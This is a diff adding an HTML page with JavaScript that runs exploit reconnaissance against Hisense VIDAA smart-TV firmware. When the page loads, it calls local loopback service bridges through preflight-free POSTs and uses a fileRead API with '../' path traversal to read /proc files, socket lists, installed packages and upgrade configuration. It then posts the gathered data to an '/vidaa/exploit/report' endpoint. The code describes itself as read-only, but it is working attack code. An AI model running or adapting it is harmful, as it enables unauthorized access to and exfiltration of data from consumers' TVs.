@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>VIDAA recon (read-only)</title>
+<style>
+body{background:#000;color:#0f0;font:30px/1.5 monospace;margin:1em;}
+#st{font-size:40px;color:#ff0;} #det{color:#9f9;} .bad{color:#f66;}
+</style>
+</head>
+<body>
+<div id="st">VIDAA RECON: starting...</div>
+<div id="det"></div>
+<script>
+/* READ-ONLY recon. Hard service/API allowlist: only tvinfo.initialData,
+   hiutils.getOSVersion/getVersionStatus/fileRead, pkgmgr.getInstalledPkgs.
+   No download-to-TV APIs, no setters, no writes. */
+(function () {
+  var R = { phase: "recon", t: new Date().toISOString(), ua: navigator.userAgent,
+            url: location.href, bridge_http: {}, wss9888: null, sdk: {}, services: {},
+            fileread_variant: null, reads: {}, bridge_globals: {}, tvinfo_setters: null,
+            tvinfo_fn_names: null, pkglist_trunc: null, errors: [] };
+  function det(s) { var d = document.getElementById("det"); d.innerHTML += s + "<br>"; }
+  function st(s) { document.getElementById("st").textContent = s; }
+
+  var SVC_ALLOW = { tvinfo: ["initialData"], hiutils: ["getOSVersion", "getVersionStatus", "fileRead"],
+                    pkgmgr: ["getInstalledPkgs"] };
+  var sess = 700;
+
+  function phx(base, name, api, args) {
+    if (!(SVC_ALLOW[name] && SVC_ALLOW[name].indexOf(api) >= 0)) { R.errors.push("blocked:" + name + "." + api); return null; }
+    var body = JSON.stringify({ path: "phoenix://service/" + name, method: "callAPI",
+      parameters: { api: api, args: JSON.stringify(args === undefined ? "" : args) },
+      session: ++sess, timeout: 6, identifier: "" });
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", base + "service/" + name, false); /* sync XHR like vendor SDK */
+      x.setRequestHeader("content-type", "text/plain"); /* simple POST, no preflight */
+      x.send(body);
+      var txt = (x.responseText || "").slice(0, 2000);
+      try { return JSON.parse(txt); } catch (e) { return { raw: txt, status: x.status }; }
+    } catch (e) { return { xhr_error: String(e) }; }
+  }
+
+  function pickBase() {
+    /* Try loopback transports; return base URL string or null. */
+    var cands = ["http://localhost:9009/", "https://localhost:9888/"];
+    for (var i = 0; i < cands.length; i++) {
+      var r = phx(cands[i], "tvinfo", "initialData", "");
+      var ok = r && (r.ret === true || r.raw || (r.xhr_error && String(r.xhr_error).indexOf("Network") < 0));
+      R.bridge_http[cands[i] === cands[0] ? "9009" : "9888"] = r && r.xhr_error ? "ERR " + r.xhr_error : (r ? "answering" : "null");
+      if (r && r.ret === true) { R.services.initialData = r.msg; return cands[i]; }
+      if (r && (r.raw || r.status !== undefined)) { R.services["initialData@" + cands[i]] = r; }
+    }
+    return null;
+  }
+
+  function tryWss() {
+    try {
+      var ws = new WebSocket("wss://localhost:9888/");
+      ws.onopen = function () { R.wss9888 = "open"; };
+      ws.onerror = function () { R.wss9888 = R.wss9888 || "error(self-signed/expected?)"; };
+      setTimeout(function () { try { ws.close(); } catch (e) {} }, 3000);
+    } catch (e) { R.wss9888 = "throw " + e; }
+  }
+
+  function probeGlobals() {
+    var names = ["TvInfo_getParam", "TvInfo_setParam", "vowOS", "omi_platform", "HiUtils_createRequest",
+                 "Hisense_SetPictureMode", "Hisense_GetPictureModeList", "Hisense_SetVolume"];
+    for (var i = 0; i < names.length; i++) { try { R.bridge_globals[names[i]] = typeof window[names[i]]; } catch (e) { R.bridge_globals[names[i]] = "err"; } }
+    try {
+      if (window.vowOS && window.vowOS.tvinfo) {
+        R.tvinfo_fn_names = Object.keys(window.vowOS.tvinfo);
+        R.tvinfo_setters = R.tvinfo_fn_names.filter(function (f) { return f.indexOf("set") === 0; });
+      }
+      if (window.vowOS && window.vowOS.service) R.sdk.vowos_service_keys = Object.keys(window.vowOS.service);
+    } catch (e) { R.errors.push("globals:" + e); }
+  }
+
+  function trySdk() {
+    try {
+      if (window.vowOS && window.vowOS.service && typeof window.vowOS.service.syncExecute === "function") {
+        R.sdk.syncExecute_tvinfo = window.vowOS.service.syncExecute("tvinfo", { api: "initialData", args: "" });
+        if (!R.services.initialData && R.sdk.syncExecute_tvinfo) R.services.initialData = R.sdk.syncExecute_tvinfo.msg;
+        if (R.sdk.syncExecute_tvinfo && R.sdk.syncExecute_tvinfo.msg && R.sdk.syncExecute_tvinfo.msg.chipsetName)
+          R.sdk.works = true;
+      }
+    } catch (e) { R.sdk.error = String(e); }
+  }
+
+  function fileread(base, pathVal) { return phx(base, "hiutils", "fileRead", { path: pathVal }); }
+
+  function probeFileRead(base) {
+    var variants = [
+      { v: "array", p: ["../proc/uptime"] },
+      { v: "string-rel", p: "../proc/uptime" },
+      { v: "array-abs", p: ["/proc/uptime"] },
+      { v: "string-abs", p: "/proc/uptime" }
+    ];
+    var good = null;
+    for (var i = 0; i < variants.length; i++) {
+      var r = fileread(base, variants[i].p);
+      R.reads["VARIANT:" + variants[i].v] = { ok: r && r.ret === true ? String(r.msg).slice(0, 200) : null, resp: r };
+      if (r && r.ret === true && !good) { good = variants[i].v; R.fileread_variant = variants[i].v; }
+    }
+    var wrap = function (p) {
+      if (R.fileread_variant === "array") return [p];
+      if (R.fileread_variant === "array-abs") return [p];
+      return p.replace(/^\.\.\//, "");
+    };
+    if (!good) return;
+    var targets = ["../proc/version", "../proc/self/status", "../proc/mounts", "../proc/net/unix",
+                   "../var/run/superwatch_socket", "../var/local",
+                   "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json",
+                   "../OAD/AppUpgradeSwitch.json"];
+    for (var j = 0; j < targets.length; j++) {
+      var res = fileread(base, wrap(targets[j]));
+      var m = res ? (typeof res.msg === "string" ? res.msg : JSON.stringify(res.msg)) : "";
+      if (targets[j] === "../proc/net/unix") {
+        var lines = (m || "").split("\n").filter(function (l) { return l.indexOf("superwatch") >= 0; });
+        res = { filtered_lines: lines, total_lines: (m || "").split("\n").length };
+        m = JSON.stringify(res);
+      }
+      if (targets[j] === "../proc/self/status") {
+        var keep = (m || "").split("\n").filter(function (l) { return /^(Uid|Gid|Groups|Name):/.test(l); });
+        m = keep.join(" | ") || m;
+      }
+      R.reads[targets[j]] = { ok: res && res.ret === true ? String(m).slice(0, 1500) : null,
+                              err: res && res.ret === false ? JSON.stringify(res.msg).slice(0, 300) : (res ? JSON.stringify(res).slice(0, 300) : null) };
+    }
+  }
+
+  function probeExtra(base) {
+    try {
+      var x = new XMLHttpRequest(); x.open("GET", base + "service/basic/fetcher", false); x.send(null);
+      R.services["GET service/basic/fetcher"] = { status: x.status, body: (x.responseText || "").slice(0, 300) };
+    } catch (e) { R.services["GET service/basic/fetcher"] = "ERR " + e; }
+    var pk = phx(base, "pkgmgr", "getInstalledPkgs", "");
+    if (pk && pk.ret === true) {
+      var list = pk.msg || [];
+      R.pkglist_trunc = { count: list.length,
+        has_jsservice_basic: list.some ? list.some(function (p) { return String(p.name).indexOf("jsservice.basic") >= 0; }) : ("jsservice.basic" in list),
+        sample: JSON.stringify(list).slice(0, 1200) };
+    } else R.pkglist_trunc = pk;
+    var os = phx(base, "hiutils", "getOSVersion", "");
+    R.services.getOSVersion = os;
+  }
+
+  function report() {
+    st("VIDAA RECON: done - sending report...");
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/vidaa/exploit/report", true);
+      x.setRequestHeader("content-type", "text/plain");
+      x.onload = function () { st("VIDAA RECON: REPORT DELIVERED (http " + x.status + ")"); };
+      x.onerror = function () { st("VIDAA RECON: SEND FAILED - copy URL bar + console"); R.errors.push("report send failed"); };
+      x.send(JSON.stringify(R));
+    } catch (e) { st("VIDAA RECON: SEND ERROR " + e); }
+  }
+
+  function run() {
+    st("VIDAA RECON: running...");
+    tryWss(); probeGlobals(); trySdk();
+    var base = pickBase();
+    det("transport: " + JSON.stringify(R.bridge_http));
+    if (base) { probeFileRead(base); probeExtra(base); }
+    else R.errors.push("no phoenix transport reachable from page");
+    det("fileRead variant: " + R.fileread_variant);
+    report();
+  }
+  if (document.readyState === "complete" || document.readyState === "interactive") run();
+  else document.addEventListener("DOMContentLoaded", run);
+})();
+</script>
+</body>
+</html>
